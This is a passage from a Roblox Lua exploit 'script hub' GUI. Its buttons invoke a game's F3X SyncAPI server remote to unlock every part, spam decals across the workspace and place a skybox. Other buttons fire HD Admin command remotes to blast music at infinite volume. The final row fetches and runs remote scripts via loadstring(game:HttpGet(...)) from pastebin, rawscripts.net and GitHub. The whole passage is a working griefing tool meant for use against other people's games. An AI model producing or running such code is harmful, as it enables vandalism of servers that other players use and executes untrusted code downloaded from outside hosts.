			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end
	function Color(part,color)
		local args = {
			[1] = "SyncColor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Color"] = color,
					["UnionColoring"] = false
				}
			}
		}
		_(args)
	end
	function SpawnDecal(part,side)
		local args = {
			[1] = "CreateTextures",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal"
				}
			}
		}
		_(args)
	end
	function AddDecal(part,asset,side)
		local args = {
			[1] = "SyncTexture",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal",
					["Texture"] = "rbxassetid://".. asset
				}
			}
		}
		_(args)
	end

	function Sky(id)
		e = char.HumanoidRootPart.CFrame.x
		f = char.HumanoidRootPart.CFrame.y
		g = char.HumanoidRootPart.CFrame.z
		CreatePart(CFrame.new(math.floor(e),math.floor(f),math.floor(g)) + Vector3.new(0,6,0),workspace)
		for i,v in game.Workspace:GetDescendants() do
			if v:IsA("BasePart") and v.CFrame.x == math.floor(e) and v.CFrame.z == math.floor(g) then
				SetName(v,"Skybox")
				AddMesh(v)
				SetMesh(v,"111891702759441")
				SetTexture(v,id)
				MeshResize(v,Vector3.new(7200, 7200, 7200))
				SetLocked(v,true)
			end
		end
	end
	Sky("84440053063061")


end)


local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.35, 0,0.298, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Kittyuhh"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 14
f3x.TextScaled = true
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local player = game.Players.LocalPlayer
	local char = player.Character or player.CharacterAdded:Wait()
	local tool

	for i, v in pairs(player:GetDescendants()) do
		if v.Name == "SyncAPI" then
			tool = v.Parent
			break
		end
	end

	if not tool then
		for i, v in pairs(game.ReplicatedStorage:GetDescendants()) do
			if v.Name == "SyncAPI" then
				tool = v.Parent
				break
			end
		end
	end

	if not tool then
		warn("SyncAPI não encontrado.")
		return
	end

	local remote = tool.SyncAPI.ServerEndpoint

	function _(args)
		remote:InvokeServer(unpack(args))
	end

	function CreatePart(cf, parent)
		_( {"CreatePart", "Normal", cf, parent} )
	end

	function SetName(part, stringg)
		_( {"SetName", {part}, stringg} )
	end

	function AddMesh(part)
		_( {"CreateMeshes", {{["Part"] = part}}} )
	end

	function SetMesh(part, meshid)
		_( {"SyncMesh", {{["Part"] = part, ["MeshId"] = "rbxassetid://" .. meshid}}} )
	end

	function SetTexture(part, texid)
		_( {"SyncMesh", {{["Part"] = part, ["TextureId"] = "rbxassetid://" .. texid}}} )
	end

	function MeshResize(part, size)
		_( {"SyncMesh", {{["Part"] = part, ["Scale"] = size}}} )
	end

	function SetLocked(part, boolean)
		_( {"SetLocked", {part}, boolean} )
	end

	function SpawnDecal(part, side)
		_( {"CreateTextures", {{["Part"] = part, ["Face"] = side, ["TextureType"] = "Decal"}}} )
	end

	function AddDecal(part, asset, side)
		_( {"SyncTexture", {{["Part"] = part, ["Face"] = side, ["TextureType"] = "Decal", ["Texture"] = "rbxassetid://" .. asset}}} )
	end

	function spam(id)
		for _, v in pairs(workspace:GetDescendants()) do
			if v:IsA("BasePart") then
				spawn(function()
					SetLocked(v, false)
					for _, side in pairs(Enum.NormalId:GetEnumItems()) do
						SpawnDecal(v, side)
						AddDecal(v, id, side)
					end
				end)
			end
		end
	end

	function Sky(id)
		local e, f, g = char.HumanoidRootPart.Position.X, char.HumanoidRootPart.Position.Y, char.HumanoidRootPart.Position.Z
		local partPos = Vector3.new(math.floor(e), math.floor(f) + 6, math.floor(g))

		CreatePart(CFrame.new(partPos), workspace)

		for _, v in pairs(workspace:GetDescendants()) do
			if v:IsA("BasePart") and v.Position == partPos and v.Name ~= "Sky" then
				SetName(v, "Sky")
				AddMesh(v)
				SetMesh(v, "8006679977")
				SetTexture(v, id)
				MeshResize(v, Vector3.new(50, 50, 50))
				SetLocked(v, true)
			end
		end
	end


	spam("93919371630544")
	Sky("93919371630544")
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.649, 0,0.673, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Gangstar Paradise"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 14
f3x.Parent = mainFrame


f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";music 6070263388")
	RequestCommand:InvokeServer(";volume inf")  
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.794, 0,0.675, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "won't stop us"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 14
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";music 1847661821")
	RequestCommand:InvokeServer(";volume inf")  
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.086, 0,0.711, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Skibidi"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 27
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";music 97034133122734")
	RequestCommand:InvokeServer(";volume inf")  
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.227, 0,0.71, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Horror Music"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 19
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";music 9039981149")
	RequestCommand:InvokeServer(";volume inf")  
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.368, 0,0.709, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Phonk"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 27
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";music 14145620056")
	RequestCommand:InvokeServer(";volume inf")  
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.511, 0,0.715, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Phonk 2"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 27
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";music 122863102226559")
	RequestCommand:InvokeServer(";volume inf")  
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.649, 0,0.716, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Erika"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 27
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";music 123507068071275")
	RequestCommand:InvokeServer(";volume inf")  
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.794, 0,0.716, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Eagles2212's theme 2"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 11
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";music 16190757458")
	RequestCommand:InvokeServer(";volume inf")  
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.086, 0,0.751, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Smoke weed everyday"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 11
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";music 6717030010")
	RequestCommand:InvokeServer(";volume inf")  
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.227, 0,0.75, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Eagles2212 Theme"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 12
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";music 3653130528")
	RequestCommand:InvokeServer(";volume inf")  
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.368, 0,0.748, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "FLAMENGO"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 12
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";music 137774355552052")
	RequestCommand:InvokeServer(";volume inf")  
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.511, 0,0.748, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Bodypartz"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 19
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";music 127653283576622")
	RequestCommand:InvokeServer(";volume inf")  
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.649, 0,0.748, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Wonga"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 19
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";music 100792696468630")
	RequestCommand:InvokeServer(";pitch 0.143")
	RequestCommand:InvokeServer(";volume inf") 
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.794, 0,0.748, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Sirmeme"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 19
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";music 78973045684083")
	RequestCommand:InvokeServer(";volume inf") 
	RequestCommand:InvokeServer(";pitch 0.3")
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.086, 0,0.787, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "HEHEHEHA"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 19
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";music 8877570706")
	RequestCommand:InvokeServer(";volume inf")  
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.227, 0,0.788, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Mihckey"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 19
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";music 3553789463")
	RequestCommand:InvokeServer(";volume inf")  
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.376, 0,0.791, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "SPARTA REMIX"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 15
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";music 76286178156432")
	RequestCommand:InvokeServer(";volume inf")  
	RequestCommand:InvokeServer(";pitch 0.1")
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.527, 0,0.791, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "other sparta Remix"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 12
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";music 115576275255776")
	RequestCommand:InvokeServer(";volume inf")  
	RequestCommand:InvokeServer(";pitch 0.2")
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.670, 0,0.791, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Tubers93"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 20
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";music 6129291390")
	RequestCommand:InvokeServer(";volume inf")  
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.810, 0,0.791, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Raining men"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 20
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";music 82490517845599")
	RequestCommand:InvokeServer(";volume inf")  
	RequestCommand:InvokeServer(";pitch 2")
end)

local titleText = Instance.new("TextLabel")
titleText.Size = UDim2.new(0, 160,0, 18)
titleText.Position = UDim2.new(0.376, 0,0.870, 0)
titleText.BackgroundColor3 = Color3.new(0, 0, 0)
titleText.BorderSizePixel = 4
titleText.BorderColor3 = Color3.new(0, 0, 0)
titleText.Font = Enum.Font.Code
titleText.Text = "--Script hub--"
titleText.TextColor3 = Color3.new(1, 1, 1)
titleText.TextSize = 14
titleText.Parent = mainFrame

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.100, 0,0.900, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Team John F3x"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 16
f3x.Parent = mainFrame
f3x.MouseButton1Down:connect(function()
	loadstring(game:HttpGet('https://pastebin.com/raw/5cDqE0Yy'))()
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.260, 0,0.900, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "cZergui"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 20
f3x.Parent = mainFrame
f3x.MouseButton1Down:connect(function()
	loadstring(game:HttpGet('https://pastebin.com/raw/9rnvXX9A'))()
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.410, 0,0.900, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "1sw0rd1 F3x"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 17
f3x.Parent = mainFrame
f3x.MouseButton1Down:connect(function()
	loadstring(game:HttpGet('https://rawscripts.net/raw/Universal-Script-1sw0rd1-f3x-hub-official-24500'))()
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.560, 0,0.900, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Infinite Yield"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 17
f3x.Parent = mainFrame
f3x.MouseButton1Down:connect(function()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.700, 0,0.900, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "RC7 Cloud"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 17
f3x.Parent = mainFrame
f3x.MouseButton1Down:connect(function()
	loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-RC7-CLOUD-F3X-44674"))()
end)


local ddd = Instance.new("ImageLabel")
ddd.Size = UDim2.new(0, 900,0, 850)
ddd.Position = UDim2.new(0.4, -300,0.3, -325)
ddd.BackgroundColor3 = Color3.new(0, 0, 0)
ddd.BorderSizePixel = 1
ddd.BorderColor3 = Color3.new(1, 1, 1)
ddd.ImageTransparency = 0.6
ddd.BackgroundTransparency = 1
ddd.Image = "http://www.roblox.com/asset/?id=140048998804156"
ddd.Parent = mainFrame

